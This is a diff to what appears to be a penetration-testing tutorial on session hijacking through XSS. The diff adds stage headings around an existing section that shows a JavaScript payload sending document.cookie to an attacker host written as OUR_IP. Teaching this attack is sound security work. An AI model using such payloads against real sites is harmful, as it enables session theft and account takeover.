@@ -244,6 +244,8 @@ Then test the fields one by one. Fields with strong validation, such as an email
 
 ## Session Hijacking with XSS
 
+#### Stage 1 — “Here are your 2 payload OPTIONS” (pick ONE)
+
 Once a working XSS payload and vulnerable field are identified, the payload can be changed to send the session cookie to the Attack Machine. Two common payloads are:
 
 ```javascript
@@ -255,6 +257,8 @@ new Image().src='http://OUR_IP/index.php?c='+document.cookie;
 ```
 
 The second method sends the request by creating an image, so the browser does not navigate away from the current page.
+
+#### Stage 2 — “Now DELIVER the chosen payload”
 
 Save the JavaScript as:
 
